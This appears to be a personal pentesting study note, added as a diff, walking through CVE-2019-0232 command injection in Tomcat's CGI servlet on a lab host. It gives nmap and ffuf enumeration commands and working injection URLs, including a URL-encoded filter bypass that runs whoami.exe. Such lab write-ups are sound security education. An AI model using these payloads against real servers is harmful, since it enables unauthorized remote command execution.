@@ -1,0 +1,511 @@
+# Tomcat CGI – CVE-2019-0232
+
+## Overview
+
+`CVE-2019-0232` is a critical Apache Tomcat vulnerability that can lead to **remote code execution on Windows**.
+
+It affects Tomcat when:
+
+- the **CGI Servlet** is enabled
+- the system is **Windows**
+- `enableCmdLineArguments` is enabled
+
+Affected versions:
+
+- `9.0.0.M1` to `9.0.17`
+- `8.5.0` to `8.5.39`
+- `7.0.0` to `7.0.93`
+
+The issue is a **command injection flaw** caused by improper input validation in the Tomcat CGI Servlet.
+
+Think of it like handing extra instructions to a batch file through the URL and Tomcat blindly passing them along.
+
+---
+
+# 1. What the CGI Servlet Does
+
+The Tomcat CGI Servlet allows the web server to execute external programs outside the Tomcat JVM.
+
+These are typically CGI scripts written in languages such as:
+
+- Perl
+- Python
+- Bash
+- Batch / CMD
+
+It acts as a bridge between:
+
+- the web server
+- external scripts/programs
+- sometimes backend resources
+
+## Why CGI exists
+
+CGI can be useful because it allows:
+
+- dynamic content generation
+- reuse of external scripts
+- support for many languages
+
+## Downsides of CGI
+
+| Advantage | Disadvantage |
+|---|---|
+| easy way to generate dynamic content | overhead from loading programs per request |
+| can use many languages | poor memory reuse between requests |
+| can reuse existing code | slower and more resource intensive |
+
+---
+
+# 2. Why `enableCmdLineArguments` Is Dangerous
+
+`enableCmdLineArguments` controls whether the CGI Servlet parses the query string into command line arguments.
+
+If enabled, Tomcat can take URL parameters and pass them directly to the CGI script.
+
+That can be useful for benign cases, but on Windows it becomes dangerous because Tomcat fails to validate the input correctly.
+
+## Example benign use case
+
+A CGI script might support actions like:
+
+```text
+?action=title&query=the+great+gatsby
+```
+
+or:
+
+```text
+?action=author&query=fitzgerald
+```
+
+This makes the script flexible.
+
+## The problem
+
+On Windows, an attacker can inject commands using:
+
+```text
+&
+```
+
+Example:
+
+```text
+http://example.com/cgi-bin/hello.bat?&dir
+```
+
+If Tomcat passes `&dir` to the CGI script without proper validation, the OS may execute `dir`.
+
+That turns a normal CGI request into command execution.
+
+---
+
+# 3. Attack Requirements
+
+For this vulnerability to work, you generally need:
+
+- Windows target
+- vulnerable Tomcat version
+- CGI Servlet enabled
+- reachable CGI script
+- `enableCmdLineArguments` enabled
+
+Without a valid CGI script path, exploitation is much harder.
+
+So the workflow is:
+
+1. identify Tomcat version
+2. confirm Windows
+3. find CGI script
+4. inject commands
+
+---
+
+# 4. Enumeration – Initial Nmap Scan
+
+Start by identifying exposed services and version info.
+
+## Example
+
+```bash
+nmap -p- -sC -Pn 10.129.204.227 --open
+```
+
+## Example findings from the notes
+
+```text
+8009/tcp  open  ajp13
+8080/tcp  open  http-proxy
+|_http-title: Apache Tomcat/9.0.17
+|_http-favicon: Apache Tomcat
+```
+
+Other Windows services were also present:
+
+- `135`
+- `139`
+- `445`
+- `5985`
+- `47001`
+
+## Why this matters
+
+This tells us:
+
+- target is likely Windows
+- Tomcat version is `9.0.17`
+- version falls inside the vulnerable range
+- Tomcat is a realistic attack path
+
+---
+
+# 5. Finding a CGI Script
+
+Knowing Tomcat is vulnerable is not enough.
+
+We need a valid CGI script path.
+
+The notes used `ffuf` with the `dirb` common wordlist and targeted the likely default CGI path:
+
+```text
+/cgi/
+```
+
+Because the system is Windows, batch/script extensions are especially relevant:
+
+- `.bat`
+- `.cmd`
+
+---
+
+# 6. Fuzzing for `.cmd`
+
+## Example
+
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+```
+
+This did **not** find anything useful in the notes.
+
+That is a good reminder not to stop after the first extension fails.
+
+---
+
+# 7. Fuzzing for `.bat`
+
+## Example
+
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+```
+
+## Result from the notes
+
+```text
+welcome
+```
+
+That revealed:
+
+```text
+http://10.129.204.227:8080/cgi/welcome.bat
+```
+
+---
+
+# 8. Confirming the Script
+
+Visiting the CGI script returned:
+
+```text
+Welcome to CGI, this section is not functional yet. Please return to home page.
+```
+
+Even though it looks harmless, it is enough for exploitation because the goal is not the script’s intended function.
+
+The goal is to abuse how Tomcat passes the query string to it.
+
+---
+
+# 9. Basic Exploitation
+
+The core injection technique is to append a command using the batch separator:
+
+```text
+&
+```
+
+## Example
+
+```text
+http://10.129.204.227:8080/cgi/welcome.bat?&dir
+```
+
+This returned the output of:
+
+```cmd
+dir
+```
+
+That confirms command execution.
+
+---
+
+# 10. Enumerating the Environment
+
+Some commands may work while others fail.
+
+The notes showed that `dir` worked, but other common commands such as `whoami` did not initially return output.
+
+A great next step is to dump environment variables with:
+
+```text
+&set
+```
+
+## Example
+
+```text
+http://10.129.204.227:8080/cgi/welcome.bat?&set
+```
+
+## Why this is useful
+
+It reveals:
+
+- execution environment
+- paths
+- CGI variables
+- script location
+- whether `PATH` is set
+- which shell is being used
+
+---
+
+# 11. Important Environment Findings
+
+The output in the notes showed:
+
+```text
+COMSPEC=C:\Windows\system32\cmd.exe
+```
+
+and also revealed:
+
+```text
+SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
+```
+
+and:
+
+```text
+SERVER_SOFTWARE=TOMCAT
+```
+
+Most importantly, the notes observed that the `PATH` variable was effectively unset for our purposes.
+
+## Why this matters
+
+If `PATH` is unset, commands like:
+
+```cmd
+whoami
+```
+
+may fail unless you provide the **full path**.
+
+---
+
+# 12. Hardcoding Full Command Paths
+
+Because `PATH` was unavailable, the next idea was to call binaries directly.
+
+Example intended command:
+
+```text
+c:\windows\system32\whoami.exe
+```
+
+## Example attempt
+
+```text
+http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+```
+
+This failed because Tomcat rejected special characters.
+
+---
+
+# 13. Tomcat Input Filter / Patch Behaviour
+
+Apache Tomcat introduced a patch using a regular expression filter to block special characters.
+
+That means payloads containing characters like:
+
+- `:`
+- `\`
+
+may be rejected directly if sent raw.
+
+## Practical result
+
+Raw Windows paths may fail even though the target is still vulnerable.
+
+---
+
+# 14. Bypassing the Filter with URL Encoding
+
+The fix described in the notes is to **URL encode** the payload.
+
+## Working style
+
+```text
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+
+## Why this works
+
+URL encoding hides special characters from the initial filter and lets Tomcat/process parsing reconstruct them.
+
+Useful encodings here:
+
+| Character | Encoded |
+|---|---|
+| `:` | `%3A` |
+| `\` | `%5C` |
+| `&` | `%26` |
+
+---
+
+# 15. Practical Workflow
+
+## Step 1 – identify Tomcat and version
+
+Use Nmap:
+
+```bash
+nmap -p- -sC -Pn <TARGET> --open
+```
+
+Look for:
+
+- Tomcat version
+- Windows indicators
+- `8009` / `8080`
+
+## Step 2 – confirm vulnerable range
+
+Check whether the Tomcat version falls into:
+
+- `9.0.0.M1` to `9.0.17`
+- `8.5.0` to `8.5.39`
+- `7.0.0` to `7.0.93`
+
+## Step 3 – find CGI scripts
+
+Fuzz likely paths such as:
+
+```text
+/cgi/FUZZ.bat
+/cgi/FUZZ.cmd
+```
+
+## Step 4 – validate script response
+
+Visit the discovered script directly.
+
+## Step 5 – test simple injection
+
+Try:
+
+```text
+?&dir
+```
+
+## Step 6 – enumerate environment
+
+Use:
+
+```text
+?&set
+```
+
+## Step 7 – use full paths if needed
+
+If `PATH` is unset, call binaries via absolute path.
+
+## Step 8 – URL encode payloads
+
+Encode Windows paths to bypass Tomcat’s regex filtering.
+
+---
+
+# 16. Useful Commands
+
+## Nmap
+
+```bash
+nmap -p- -sC -Pn 10.129.204.227 --open
+```
+
+## Fuzz `.cmd`
+
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+```
+
+## Fuzz `.bat`
+
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+```
+
+## Basic command execution
+
+```text
+http://10.129.204.227:8080/cgi/welcome.bat?&dir
+```
+
+## Dump environment
+
+```text
+http://10.129.204.227:8080/cgi/welcome.bat?&set
+```
+
+## Encoded `whoami`
+
+```text
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+
+---
+
+# 17. Key Takeaways
+
+- `CVE-2019-0232` is a Windows-only Tomcat CGI command injection issue
+- the vulnerable condition depends on CGI being enabled and `enableCmdLineArguments` being on
+- finding a valid CGI script is the main practical hurdle
+- `.bat` and `.cmd` files are the most relevant script types on Windows
+- `?&dir` is a good first test payload
+- `&set` is excellent for environment discovery
+- if `PATH` is unavailable, use full binary paths
+- URL encoding helps bypass Tomcat’s regex-based filtering
+
+---
+
+# Tags
+
+#tomcat
+#cgi
+#cve-2019-0232
+#command-injection
+#windows
+#ffuf
+#nmap
+#rce
+#attacking-common-apps
+#pentesting
+#ctf
+#obsidian
